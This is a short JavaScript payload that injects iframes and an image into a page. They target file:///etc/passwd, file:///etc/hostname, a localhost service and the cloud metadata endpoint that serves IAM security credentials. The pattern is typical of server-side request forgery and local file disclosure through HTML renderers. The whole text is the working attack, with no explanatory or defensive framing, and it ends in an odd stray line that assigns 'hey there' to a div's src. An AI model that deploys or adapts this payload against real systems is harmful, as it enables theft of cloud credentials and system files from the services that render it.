(function () {
  function make(tag, attrs) {
    var e = document.createElement(tag);
    for (var k in attrs) e.setAttribute(k, attrs[k]);
    return e;
  }
  var payloads = [
    { tag: 'iframe', attrs: { src: 'file:///etc/passwd', width: '800', height: '400' } },
    { tag: 'iframe', attrs: { src: 'http://localhost:8080/', width: '800', height: '300' } },
    { tag: 'iframe', attrs: { src: 'http://169.254.169.254/latest/meta-data/iam/security-credentials/', width: '800', height: '200' } },
    { tag: 'img',    attrs: { src: 'file:///etc/hostname', width: '1', height: '1' } }
  ];
  var root = document.body || document.documentElement;
  payloads.forEach(function (p) { root.appendChild(make(p.tag, p.attrs)); });

 var i = document.createElement('div');
i.src = 'hey there';
document.body.appendChild(i);
})();
